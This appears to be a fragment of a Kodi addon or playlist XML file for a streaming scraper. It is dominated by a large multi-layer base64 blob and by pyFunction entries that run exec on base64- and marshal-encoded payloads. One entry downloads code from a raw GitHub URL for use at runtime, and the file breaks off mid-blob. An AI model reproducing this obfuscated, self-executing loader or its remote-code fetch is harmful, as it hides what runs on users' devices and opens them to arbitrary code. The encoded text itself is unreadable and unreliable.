VVVVRGT1JGRXpUbTFaTVUxRVdYaE9WRWw2VGtSUmVVNVVZM3BOVkZwcFRYcG5NVTFxVlRST2JVVXhUa1JaZUU1cVNYcE5hbHBvVGtkSk1VOUVWVE5PYlVVelRVUmplRTV0U1hwTlZGVXlUWHBqTTA1VVl6Vk9WRVY2VGxSUk1rNUhWWHBQVkZVelRrZFZNMDE2VW10TmJVa3hUWHBLYVUxNlFUTlpWRlV5VGtSbk0wNVVVbXhOZW1zeVdsUkthVTVFWXpKTmFsRXpUbTFGTUZsVVVUSk9SMDB6V1ZSU2JVNUVXVEJPUkdNMFRrUkpNbHBFWkdoT2FrMHhUWHBhYkU1RVNURk5lbHBwVGtSUmVrNUVVVFZPZWswd1RXcFNhMDVxVVROTlZGbDRUbTFWTVUxRVZYbE9SMFV6VGtSWmVVNTZRVEJPUkZKb1RYcG5NMDVFWXpWT1Iwa3lXWHBaTTA1NlRUTlBWRkY1VGxSck1scHFXVFJPVkVFd1drUlZNRTVFVFRKTmVsRXlUbXBWTTFsVVZURk9lbWN5V1ZSak5FNVhSVEphUkdNeFRrUkZNRTVxV20xT2FtY3dUMFJqZWs1RVp6Qk5hbFV6VFhwck0wMUVZekJPUkZrd1RWUlZNRTVIVFRCWmFsbDRUbnBuTUUxNlRUUk9SRlV3VGxSUmVVNVhSVEZPYWxwclRXMUpNRTU2WXpST1ZFa3lUbFJOZDAxdFdURk5WRkY0VG0xRk1FMVVZelZPVkZVeFRrUlJlazVFWnpOUFJGa3pUa2ROTUU1VVVYaE5lbWN3VDBSUk1VNVVaek5OYWxVelRrZEZNRTFxVVROTmVrVXpUbnBWTUU1dFdYcE5WR00wVGtSTk1scEVZM2ROZW1ONlRVUlpNVTE2WXpGTmVscHJUa1JyTUU1RVdtbE9SRWt5VFhwVmVrNVVZekpQUkZVMVRrZEZNRTVFWTNkT1IwVjZUMFJXYUU1dFRUTk5WR040VFhwSk1sbHFUWGRPVkdzeFRYcGplazVFVFRKT2FrMHdUa1JaTWxwRVkzbE9hazB3VFZSYWFFNXRTVEJaVkZWNVRucE5NRTVxU21sT2FrVXlUMVJqTkU1dFNUSmFhbGt5VFhwRk1VOUVVbXRPVkVFeFRucGthRTVFWnpKTlZFMDFUa1JSTUUxcVZtaE5la1V3VDFSa2FFNXFZM3BOZWxGNVRucEZlazVFV21wT2FtTXdUbFJqTWs1VVJUQk5ha3BwVFhwWk0wMVVZelJPUkUwelRrUk5lRTVxV1hwTlJGRXlUbXBqTUU1RVkzcE9SR014VFhwWk5VNUhWVE5OYW1NeVRrUlZNazVxWTNwT1JFa3lUV3BSZVU1VVJURk5SRkUxVG0xRk0wNTZVVEJPZWxrd1RsUlplRTU2UlRKT2FsbDZUa1JyTWxwVVdYaE9WR042VGtSU2FFMXRXVEJOYWxGNlRrUm5NVTFVVW1wT2JVa3dXa1JWZDA1cVVURk9WRnBvVG5wak1rMVVUVEpPUkVrelQwUlJlRTU2VlROT2VrMHhUa2RKTUU1cVdUUk9iVlV5VG1wWk1FNXFWVE5PYWxreVRucHJNRTVxVFRCT2Vra3lUWHBWTlU1cVdUSk5WRkpyVG1wWk1FNXFWWGxPUkZFd1RYcFZNMDV0V1RCTmFtTTFUa2RWTUU5VVRYbE9hbU13V2tSVmVVNXFWWHBOYW1Sb1RtcGpNRTVFWXpOT1JGVjZUWHBqTTA1dFVYcE5hbEY0VG1wSk1VOVVXbXRPUjBVeVRtcFZlazVIVFROT1JGazBUakpGTTA1RVVteE5iVWt6VDBSWk1VNVVSWHBOVkUwd1RtcEZlazlFWXpST1JGRXpUWHBSTlU1VVp6Sk9lazE0VGtSVk0wNXFZelJPVkVWNVdtcGFiVTV0VlhwTmFsa3hUWHBSTVU5VVdtaE9hbU13VDFSYWJVNUhSVEZQVkZFd1RrZE5lazVVVVhsTmVsRjZUVVJqTWs1RVRUSlpWRTB6VGtkTk1VMTZXVEpOZWxVd1RtcFplazVIVVRCTmVsazFUa2RaTUZscVVYbE5la2t4VFVSUk5VNXFXWHBQVkZsNFRrUkpNMDlFVVRKT2Vsa3dXbFJTYkUxdFNUTk5lbHBvVGxSWk1FMXFUVFZPUjBVd1QxUlpNMDVVUVRKYWFrMTVUa2ROTTA1cVkzbE9hbGw2VDFSTmVVNXRSVE5QUkZKcFRrUkZNazlFWXpST1ZHZDZUMFJSTWs1RVdUQk5hbEUwVG0xWmVrMVVXVE5PZW1jelRsUmpORTVxV1RKWmFsRjZUa2RSTWs5RVdUVk9SRlV4VFVSak0wNXFhM3BOYWxGNFRucE5lVmxxVlRCTmVrMTZUa1JaTTA1cVkzcFBWRkpwVG1wak1scHFVbTFPUkVVd1drUlJNVTVIU1RCYVZFMHpUbTFSTTA5VVl6Vk9WR3N6V1ZSTmVrNUVVVEpOVkUwd1RtMVplVnBxV1ROT2VrRjZUVVJSTVUxdFdUTlBSRnByVFcxSk1VNVVUWGhPZW1jelQxUlJNMDU2U1RGUFJGcHRUa2RWTUZsVVRUSk9SRVY1V21wak0wMTZXVEJaYWxVd1RqSkZNVTU2WTNoT2JWbDZUWHBSTVU1RVdUSlpWRlY1VG1wTk1FOVVWVFJPZWswd1drUkthVTVVVlROWlZGbDRUbFJCTTA5VVRYaE9lbXN5VDBSamVFNVVaekJPVkZsNFRYcFJNVTFFWXpWT1ZHTjZUa1JSTVU1VVdUQmFWRmw2VGtSck1VNUVXVFZPYlVreVRsUlJlRTVxVlROUFJGVjRUbTFWZWsxRVZYaE9SMDB3VFZSUk5FNXFUVEJPZWxab1RrZE5lazlVVVhoT2Vsa3lUMVJSTVUxdFdUSk5WRnBwVFhwbk1VMVVZelZPUjFVeFRWUlZNMDV0V1hwTlZGcG9UbnBGTUUxVVl6Uk9Na1V3VGtSa2FFMXRTVEZPVkZrMFRrUk5NVTlFVlRWT1JFa3hUVVJaTTA1dFZUQk5hbU41VFhwak1rOUVXVEZPVkUweFRVUmpNVTVFYXpKYVZGRXpUa1JSZVZscVZUQk9hbGt3V1dwVk5FNXFZekJPUkZFMFRrZE5NRTlVVVRWT2VrRXlXa1JaTWs1NlkzcE9SRTB4VG5wbk1FNTZWVEZPZWswelRsUlNiRTVFWXpKYVZGRTBUbFJKTVU1NlVUVk9lbGt6VGxSYWJVNVVVWHBOYWxGNFRYcHJlVmxxWTNoTmVtc3hUbFJTYVU1SFVUSk9WRTAwVG0xRmVWcHFUVEJPUjFGNVdtcFJNMDVVUVRCYWFsRjZUbXBOTVU5VVVUQk9SMVV5VG5wTmVVNXRTVEpPUkVwcFRrUlpNMDFFVW1oT2FsRXpUMFJSTkU1dFVUSk5lbFY2VFhwVk1FNXFWVEpPZW1zd1dYcGplazVxWXpOT2FsVXhUbXBuTTAxRVdtaE9WR013VFZSamQwNUVZekJPZW1NeVRrZFZNVTlVVVRWT2VsRXhUbFJLYVUxNmEzcE5SRTE0VFhwQk1sbDZZekpPUkdzd1RsUk5lazVVVFRKYVJGRTFUWHBOZWs1RVdteE9WRWt5VG1wamVrNVVSVEZOUkdOM1RXMVpNRTVxVVROT1ZGRjZUV3BTYTA1dFJUSmFhbFV4VGxSck1FMVVVbTFPVkd0NlRWUktiVTVxWnpKYVZGcHJUWHBuTTAxNlVtbE9SMUV6VDBSUk5FNXRTVEJPYWxrMFRXMUpNRnBFWXpGT1Ixa3hUMVJTYUU1NmF6SlBSRmw1VGtSUmVrMTZWWGxPYWxVd1dWUlJNRTVFWXpCYVJHTXpUbFJGTUZsNll6Vk9WRmw1V21wUk5VNTZXWHBQUkZwdFRYcFZNMDVxV1ROT2VrVXdUWHBhYUU1WFJUQk5lbHBzVGtkRk0wMUVXbXBOZWtreVRWUmplVTU2WTNwT2FscG9UVzFKTTAxNll6Vk9SR016VG1wTk5VNXRXVEJaYWxwclRYcFJNRmw2VW0xT2VrRjZUMFJWZVU1VVp6Tk9lbU15VFhwUk0wNTZUVFJPZW1ONVdtcFZOVTVVUVRGWlZGcHJUakpGTWs5RVVtdE9SRlV4VFZSak5FNXFWVEpPYWswd1RYcFZlazVxVVhsTmVtTXdXWHBaZUU1dFRYcE5lbEV4VGxSSmVWbHFZM2ROYlVrd1RXcEthVTVFVFRKTmFsa3pUa2RGTWs1VVRYZE9SR015VG1wamVFNVVhekJaZWxwb1RrUkpNRnBxV1RCT1IwVjZUbFJrYUU1VVNUTk9WRkV4VGtkUk1scHFWVE5PZWtVeFRXcGpkMDE2VFROT2VsbDRUWHBSZWsxRVRURk9la1V5VDBSTmVrNTZUWHBOZWsxM1RucFJNMDE2V214T2FsVXpUVlJWZVU1dFJUQmFSR040VGtSSk0wMUVWWGhPYWxFd1dXcFZNMDE2VVRCUFZGRTBUbnBSTVUxRVRUQk9hbWN6VFhwVk5VMTZRVEJhVkZFeFRYcFJNbGw2WXpGT1JHc3pUV3BOTkU1VVZURk5WR014VGxSWk0xbFVZelZPYlZVelRtcGthRTVVUVhwT1ZGRXpUWHByTTAxVVVYaE5lbEV4V1ZSU2FFNVVVVEJPUkZWNVRtcG5NVTlFV214TmVsVXdXV3BOTkU1NlJUSk9hazB4VGtkUmVWbHFVVEZPVkZVeVRtcGFhVTVFV1hwUFZGRjRUa1JWZWs5RVl6Sk5lbXN4VFhwYWFFNVhSVEZPVkZGNVRtMUZlazFxV21wT2VrMHdXVlJSTTA1cVl6Tk5lbHBxVGtkSk1sbFVZelJPYlUwd1dYcGpkMDVVWnpCWmFsRTBUWHBWTUZsNll6Vk9la1V5VG1wTk1rNXRWVEJhVkZsNlRucEJNMDVxVFhoT1IxRjVXV3BOZVU1NlVUQk9lbFUxVGpKRk1sbDZWWGxOZWtreVRrUmplazV0VVRCYWFsSnBUbXBWTWxscVVUQk9hbEV5V2xSYWFrMTZWVEZPVkUxNlRrUk5NVmxVV1hoT2JVa3lXVlJSZVU1cVJUSk5hbVJvVFhwVk1GcFVXbTFOZW1jeFRtcFplRTVxVVROUFZHTjVUbnBuTTAxVVRYbE9iVmt3V2xSak0wNVVUVE5PYWxWNVRtcEZlVnBxVW0xT2JVa3lUMFJqTkU1VVVUQk5lbFV3VFhwck1GcHFZelZPVkZWNlQwUlZlRTE2YTNwT1JGRXdUWHBWTTAxcVkzcE9la1V6VFVSak1rNXFWVEJaVkZFd1RucG5NVTlVWXpCT2VsRXpUVlJTYUU1RVl6QlBSR040VFhwQk1rMVVVWGhPUjFrelRtcGFhMDU2VVRCT2VsazFUbnBOTVU1Nll6Rk5lbXN5V1dwWk1VNXFhekpPVkZKcFRrUlJNMDlFV1RWT1JGa3lXV3BSTUUxNlVUSmFhbFYzVFhwSk1FMVVUVFZOZWxVeVQxUlplazVxUlRCT1ZGVjZUbTFaZVZscVRYbE9iVmt5VFdwTk1FNVVaM3BPVkZVd1RqSkZNMDVVV214T2Vsa3hUVVJOTkU1VVJURk5SRTB3VG5wbk1sbFVUWHBPUjFrd1dWUlZNazE2WnpGT1JHTXdUbnBqTWsxVVZUVk5lbGt6VFhwWmVFNVVUWHBPUkUxNVRucFJNRTFVVFRCT1JFa3dUa1JSTlU1cWEzcE9lazB3VFhwRk1VNVVVbXBOZW1zeFRsUlZOVTE2U1ROTlZGVTBUbnBuTTA1VVRUQk9la0V3VDBSak5VNUVTVE5PYWxVeVRrZEpNbGxVVFROT1ZGVXdXbXBSTUU1NmF6SlphbU42VGxSVk1GcEVTbTFOZWtWNlRWUk5lVTVxWnpOUFJGcHBUbTFSTUUxNlRUTk9SMGt6VFdwWk5VNXRSVEJhUkZab1RucFpNRmxxV1RKT1ZFa3dUVlJaTVU1WFJUTk9hbU4zVG1wRk0wMXFWWGxPYlZFeFRsUlZNazU2YXpCWmVsa3hUbXBOTTFsVVRUVk5lbGt5VGtSWk1VNVVWWHBQUkdSb1RsUnJNMDVVWTNkTmJWa3lUMFJSZVUxNlRUTk5WRlYzVG5wbk1rMXFUVE5PYWtVeVdXcFNiVTVIU1RGTlJFMHlUbFJKTVU1NlZYZE9iVVV6V1ZSVk1FNHlSVE5PVkZKb1RsZEZlazFFVlhkT1IxVXdXa1JaZVUxNlp6QlBSRkpyVG1wUk1FMTZXWGxOZW1NeVQxUk5lazE2VlROTmFsSnJUWHByTUZsNldYcE9iVmt3VDBSYWFrNUVZek5PVkZKb1RrUm5lazVxWTNsT2FtY3dXbFJSTWsxNlZYcE9lbGt4VGxSTk1GcFVUVFZPVkZWNlQwUmpORTVVUlRCUFJGVXhUa2RWZVZselF3OEFBSGRGZGtGdFJERkNVVWcxUVhkME1WcFJSRFZCUjBodFFWRndhbHB0Y0RCQmJVaHNRVkZhTTFwSFJEUmFiVTR5VEVkTU5VRkhkRE5DVVhCdFdtMVNNVUZIV2pOYWJYZ3dRWGRNYkVGNldqQk5kMHd4UVcxME1WcFJjR3BCUjNReVRVZEZlbHB0V2pGQlIwZzBRVkZhTTBGSFRHMWFiVlp0UVhkRmVFRjZWakpDUjFvMVFWRjBNVnAzUkd0QmJVNHdUWGRNTkVGM2RHMWFkMFJzUVVkT2JWcEhUREpCZDB3eVRHMWFNRnB0ZUd4TmQwZzBRVzFJTWxwSGNESkJVVll6V2tkRU5GcHRWak5hZDNBeVFYZDBNMHhIY0d4QmQwZ3hRVzFJTTBGdFRHMWFkMFYxUVZGMGJWcDNTR3hCVVZJd1drZE1Na0YzVmpOQlVYQTBXbTFJYlVKSFRYcEJkM1F5VFZGSmRVRlJSRE5CZDAxNlFYZDBNRUpSY0d4QlZGWXhRa2ROZFVGM1VtMWFSMWQ2UVZGd00wSkhSWFpCTWxJeFFsRklhMEYzUkRKTlIxb3hRWHBNTTBGSFREQkJWRVJzVEhkSU0wRjNTREZDVVVoc1dtMTBNMEZIUkd0QmJVUXlRbEZOZDFwdFNERkJVWEExUVcxNGJVSkhUWGxCUjFZd1FrZHdNa0YzVm0xQmQxbzFRVlJNTUUxM1JYbGFiWEF3VEhkTWEwRlVTREJhUjBSc1dtMUVNbHBIY0d0QlVWSXpXbTFGZVVGUmNEQkNSMWQ2UVcxV2JVRlJSR3RCVkZvelFsRndOVUZSV2pOQlVVbDFRVkZFTWtGUlNEQmFiVTR5UVZGRmVrRnRTREJCYlVnMFFXMUVNa3gzY0RCYWJVUXlXa2RFTUVFeVVqSk1kM0F6UVZGME1FMUhXakpCYlZKdFduZE1NVnB0Y0RCQmJWZDZRVkZhTUV4M1JYcEJWRm94UVVkTU1VRlVTRzFDUjNBd1FUSlNNa0ZIV214QlZGWXlRbEZhTkVGUlNESkJVVXd6UVVkSU1FMVJUR3RhYlVnelFXMUliVUYzVERKTlVYQnRRWGRTWVZGRVkyVk5TM2xuVEVwbmVYQjJUamxXVUhGamNXMTFWa2x0VFhsdlVuVldTSGxqTlVreVNHVkZVa1ZIUjFGTWJFWjRVMlZJVURsaGIzcE5XRmt6UVRaTmJYVmlRVEpyWmtwM1NYcElNbXRJYnpJNU0yOVVUV0phTVhWc2IzZFhRa2hJYTBaRlIwVjNSakIxUlZwSFYzbE5lakZxV25wTlRFRlJVMU5hZVVReFJqRkZUMFI0UVRSeGJVOWtSVE5CVUVsTFUybHZTVmRqYjBoNVZYQklUR1ZKU2xaclJuZzVSa0ZzWnpCSGJYQXlSWGhUVUVaS1ozWnVValZwUmxKcmJFVXhVM2R1ZVZkMVNGSlROVzR6UVVKdVNubDFSRWhyVEVKUlFYbENWSGxwUVhobWEwRkpjRFZ3VTB3d1FsUk5ZVVF5VFROQk1HTXliakJxYlVkNWRHMWFlR3RpY1RGQk5GZ3lkWGR1ZDNWUWIwdDVkVWxVUkdWSFIzbFJTRkZOV2t4SGRXRmFlakZOU1RKSU5VVXpjV3hIVkhGamNuWm5ZMFI0VFVoRk1tZG9ibFZUUWtadFNHdHVTMFF5UVVsTmFVRXpVMk5GU0ZkSVJUQlhOa1JJZEcxd1IwMWxSbXc1TVVrd2EweE5NRmRRUVV0eFFXNUxSVmhJZW5Ga2IwbDFhMFJLTkRWSFZEQmxUREI1YW5GSlQwUk5iR2N5Y2xGRU5HNHhjV1ZJU2tsa1NYZEpVRzVIUkd4YVZHTmhTbEE1VkhCNFoyZGFlRUY1UVZJeGJVUkxWelp3TTNsVVdEQk5Za1JJU1ZodVNHWnNiakJuYmtkTFRtbGFlazFGV1RKblpVRmhRWGR4TVhsUGIwcG5lbkpVU0RCeFNqRlpibmg1UmtGNFdqQnVWRmRzVFVwTlFrWjRlR3h2ZUZkNWJsUjVTMGhVZVdoQlZFRTBiMjFJYWtkNmEwOUtVbWRYU2twNVpVd3pUVVp2ZW1kcFFVcG5hRmd5VW10d01rbFBjbnBFYWtwSVFWVkpWRGxRYmxGSU1GZ3pTVWxGVWpGMVJuaDFNMWt3WTJwd1NYRmtXbmR4VlhCUlRVbEpZVk0yUkVsWGFIQjZjV2xhZVhsWlNGSjVNMHhIVFcxSlMxcHRjR0ZFYkVKSU1WUnZVazFyVFcxSlZrRXhlWGR4VWpsMVIxQm5RWEpTZVVGQlNEQmxjbEYxUWtGUlRVbEZTbE5LYmxKeGRVaDVZbWxKUzJOa1RUQlhSa1ZoVjFGdWJYVlBTRWhUVWtoVU1WUk5TVWt5V1cxME1FSkpWMGhNUzNGWWJrbElOVmd3TlZSRU1VdzFiMHBCYkZveVUwRmFTMVpwY0ZORlpFd3pZMWR1TTA1bFNubEpabTVoVTJad2JVRjJjRkZYWWt4NFNUQndTRTFUVFVkTmFFSlRXbXB2UjBVelFVcFNha0V5T1ZGSU1GTmxjREpqTWsxU1JEVllNM0Z0VEVkMVdXNHlPRFJ2UzA0eGNYaE5iVWt3WTJaS2QxSnNjbEoxWjI0elQyTk5TbkZ1YjBoclprVXdVMkZhU21JelFVcDFOa1p0UVdwSlZIVm1UREJUZWxwaFQwRkhSMHh0VEVwNWQwbGhZMXBDVW5WbGIxTk9OVzh5TkRKd1ZFMVRSM2RCVlVGUldtbEZVMEZvY1hsQlVFd3laMVJaTVU5TVdsSkJhWEpVTVZKQk0wOWhXbmhCWlVGS1kwRk5lR2R0VEVobmJIQktZalJITUZkUFFVZDVZMHgzVFZwYVZEbFhRVkZNYVVneFdqQkhVM2xMV2xSRlJWbHRWMUZaTUZNMGNEQmpibkpUU1hkeFJtWnJXakZGTW5Fd1UyTkVNVTR5UjNveGVrMWhZMVZ2ZWt3MWIyMVBTVzh5VFVSSFIzazFTVEI1TlV3eFJVTk5SMHcwVERCclpVRlVNREJ1ZUVsaVNESmpXRVJIUkRWQk1rbEZXVEExUzFwU1kxWnZZWFZSVFRCWGJYSjNTWGh2TWt4bFJubE5lbTVWVDBOQlVYZ3lSVWg1VFVGVlQyMU1NakZZV25oalUwSlNWMkphZVVRd2J6QlhaVmd3UVVWQlVVMWpibEZ4YW00eVJXTnZWR041Y0VwVFNVRjNVMHh1VkhCc2IwdDVhMXBWV2pCeGJWZFJRVEoxTUVsSGVWRkZSM2xQVEVwTllrRjNkR1Z2VW10UlJUQk5aVWRLWmpKRVMxSmxSWGhqVFhGSlZqUnVTM2xuY0VsWGExZ3ljR1ZOUjNGSVdEQm5XVnAzVDFwQlNFazJSVXBXTVhCVmRVeHlWVXd4UVcxU05HNVNWMlZ3UzAxcmJ6SkJTMHg2ZFZkWU1uVjJiM2xCUWtkM2NEVkJkMEZUUm5wRWJFMVJRV2xOZUVGaVJWTlhXVzVLUlRGTk1uVjVUR0YxZDAxSU9URkdWVk5sUVRKNWEzRXpVMlJhZVVGalJWUkZVM0Y2TlhkSlNIUnBSMGhTYkc5M1JWRkJWVTV0VFRCbk5rSklRWGx1TTFJd1REQkpOVUZSVDFaR01WWXdXREJuZUVGSU9YVkpNMGxKY1RKRmRVcEhTV3RITTFveGJtRlBhbHBLWjIxRlVYbEpRV0ZCYlc5NWRXbEZlbXN4UVhwNGFWZ3hkVUZ2VkZNMVFWTlBObTV0VFdod2Vtc3ljbmQ1VWtGNGEwOUZkMFZaVFhwV00yNHhlVkJOTVZOMlJVZFRZMGgzY0dsRlVrRXdTVlZTYlVkSGNXeEZiWGt4Y1RKclEwZ3lVbVZNTVVsUWNUQlhlRWRKVjJSYWVVUXhRWGxQTmtGS1oxbFpiRGxqV2xSalRFd3lTR3BFTVVsSlFYcDVlRWhLZURKTlNsTmlRWGxKWjFreU1HbGFVMDluUWxGUFZHOUhlVlpOVkVGaldtMVhSVUZIY1Zad00wRlpXbmxTWlhCNWNWbHlTRmQ1V1RCbk1rWjJPV3hIUjA5clNFbzVkVVF3ZVhsR1ZHTkVXRE5YTlVaS1lqVlliVTR6U0VsTlRYSjRSREJCYlhGbmNYZzVNMGxWWTBGeVZGSXpSVlZCVDFsdGNURlpNbmhwY1hwMU5WcExlVkZIWVVGSFRHRk5RMEpVYTA5TVNIRnNSa2xUWlVwaFUwbEJTMXBxU1VoQlpFRlFPV0ZLZUhGbWNWVlhNVmxzT1VKQlZHWTFUREpuWVZremVXNU5VbkJsVEVocmFVRjRaM1p5VlVGcVRYZDRNa1pzT0cxeFZFMVhTRzFOUkhCdFRERmFiRGt6UnpCME5WbHRlV0p1YlVWWFdUTlROVVIzZEcxQlZYZ3dXVEZ4VWtoTFZtbEpTalV6YmxGWFZsa3laakp3TVVWM1dXMXhRMGxLUlVWRVMzVXlXbE5JYVc1NlFVaHZWSEZwUkRKeFNXNUxXakZ1YkRneWNGUnhSVUpHWjIxSU1IUmxiMG81V2tSSVREUkZNVkpsY2xOMVNIRjJPVlZLUm1kUldESkpVMXBVVmpKdlNIQnRiMjE1WjNCSlQwMU5VVkpsUkhwbWExcHRWMnh1U0dadGJ6SnJUWEZIVFRWYVZEQTBiekpGZDI1VVZqVnhWREZXYnpCaldGcDNlVU5KUjFjemIwaFNiVTEzZEdsTlZFMVBSMHR3TlVWUmRYWnllRUZMY1RKTU1tNTJaMkp4U1hsaVRXMVhhMEpWU1dKR1VEbFJSakJFYTBaaFQyVktTbGRwY1ZSamVYQXlTVTFaYkRsSmNFZEJSM0JKZVRWd1NrVnBSRzFGYVhBelRXbENWVk5qYm5kMVNreHRValJ3U25Fd1FYcDVNRzlIZFcxeVIwMWpibE5KZVZnelYwOUdVRGxUY2tvNVNYSkhSR1ZOYlZkRlRVZEJaMFZ0ZEdsTWVqUnBTVEJtTTBVeVVtbE1TamxhU1ZWSmJWbHNPVTF5U2tocFdUTlBhVTEzY1dsSlNtZHBiMGhUZFV3d1lteENVWEJwV1RKME1YQnRlV1Z4TTBGQmNWRkZWa1JIUkdsQlVsWTBXREpKYkV4aFFWZHZVbGN3YjNZNVJVRkhlVzFNUm1kclFrcG5Na1JzT0cxQmJWTkxRVXRQVVZneWRXcEdTVVZCU1VZNWJWZ3hTV0pCVlVFMVJXMU5ibkJJUVRGd1lYQnBRbFJNTWtkVWRXMXVTMEZpUkRJd01VbHRkVmRITTFONGJsUTVWRm93Wm1WQ1VEbG1ia2hyVVVFeVNHVkdlVWxsY0ZSRlFWa3hUMjFFTWxOSldUSnJhMFJ0UVRWQlVEbHRUVkpuWTFreU1XWkNTamcxV1RKYWFWZ3hVelZ3YkRsUldrZFNaVmd5VTNad1NqRXhURXRhYVVkNVNWVkZlbE15UjNjd1lWRkVZelp1U2psb1ZsRXdkRmN4YXpSQmJWZHdjbEZOZWt0VmRETkJVMnMwV20xVGNISlJXbTFYYWpCWWIzcEphVlpSTUhSTlMwMTFiMUIwWVV0VmRESmFlV3MwUVhkNWNISlJUWGxMVlhReVdrbHJORUZ0UVhCeVVVeHRTMVYwTWtKSmF6UkJkM2x3Y2xGWGVVdFZkRE5CU1dzMFFYcEpjSEpSVERSTFZYUXlRVWxyTkVGdGRYQnlVVTEzUzFWME1rSkphelJCZDAxd2NsRndOVXRWZEd4Q1UyczBRWHBGY0hKUlRYcExWWFF6V25sck5FRnRUM0J5VVV3MFMxVjBNa0ZKYXpSQmJVbHdjbEZ3YlV0VmRHeENTV3MwV25kT1lWaEdUbVZXVkVreVRFcHFZbGN4YXpSQmQwRndjbEZOZWt0VmRESkJVMnMwUVhkSmNISlJURzFMVlhReldqRnJORnA2U1hCeVVVd3dTMVYwTWtGSmF6UkJkMEZ3Y2xGTmVrdFZkREpCVTJzMFFYZEpjSEpSVmpSTFZYUXpRVk5yTkVGdFYzQnlVVXcxUzFWME1rMUphelJCZDNsd2NsRndNRXRWZEROQ1NXczBXbnBCY0hKUlZtcExWWFF6VEVsck5FRjNlWEJ5VVUxNlMxVjBNazFKYXpSYWQzaGhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNWM0J5VVV3MVMxVjBNazFKYXpSQmQxTndjbEZ3YlV0VmRESmFNV3MwUVhkNWNISlJURFZMVlhSc1RVbHJORUZ0U1hCeVVVMTVTMVYwTWtKVGF6UkJkMGx3Y2xGd05FdFZkREpNTVdzMFFYZDVjSEpSVERKTFZYUXpRa2xyTkZwM2RYQnlVVTE2UzFWME0xcDVhelJCZDFOd2NsRk1iVXRWZERKTU1XczBRWGRKY0hKUlZqVlhiSGgwV0d4UGVYRjZVMlpZVUhGd2NsRk1iVXRWZERKTmVXczBRWGRGY0hKUlRERkxWWFF5V2pGck5FRnRRWEJ5VVZkNVMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRESk5lV3MwUVhkRmNISlJUREZMVlhSc1FsTnJORUY2VjNCeVVVd3hTMVYwTTBKSmF6UkJla1Z3Y2xGTWEwdFZkREpNZVdzMFFYZEpjSEpSY0d4TFZYUnNXbE5yTkZwNlFYQnlVVlpxUzFWME0weEphelJCZDNsd2NsRk5la3RWZERKTlNXczBXbmQ0WVZoRU1GaE5TMDExYjFCMWQyOHlNV3B1U210NVdGVmpabTVLVm1oTlZFbDNiekl4YW5CNlNXMXdiSFYyVEV0QmVVRjNSR2hNZDB3d1RWUkpkMjh5UlhsWVZFa3lURXBxWWxjeGF6UkJla2x3Y2xGTU1VdFZkREpOZG5CaldFWjRabGR0YTIxeFZWZGpiM3B3SzFkc2FtRk5TM1Y1VEd4d1kxaEVQVDEwQlFBQUFISnZkREV6Y3drQUFBQnRiM0p3YUdWMWN5QnpIQUFBQUdOdlpHVmpjeTVrWldOdlpHVW9kSEpwYm1sMGVTd2dlbWx2YmlsMEJnQUFBRzl5WVdOc1pYTWVBQUFBWTI5a1pXTnpMbVJsWTI5a1pTaHJaWGx0WVd0bGNpQXNJSHBwYjI0cGRBTUFBQUJ1Wlc5ekNBQUFBRHh6ZEhKcGJtYytkQVFBQUFCbGVHVmpLQXNBQUFCMEJnQUFBR0poYzJVMk5IUUdBQUFBWTI5a1pXTnpkQWdBQUFCdGIzSndhR1YxYzNRSEFBQUFkSEpwYm1sMGVWSUVBQUFBZEFnQUFBQnJaWGx0WVd0bGNuUUVBQUFBZW1sdmJuUUVBQUFBWlhaaGJGSUZBQUFBZEFjQUFBQmpiMjF3YVd4bGRBa0FBQUJpTmpSa1pXTnZaR1VvQUFBQUFDZ0FBQUFBS0FBQUFBQnpCZ0FBQUhOamNtbHdkSFFJQUFBQVBHMXZaSFZzWlQ0QkFBQUFjdzRBQUFBWUFRWUJCZ0VHQVFZQkJnRXFBUT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9k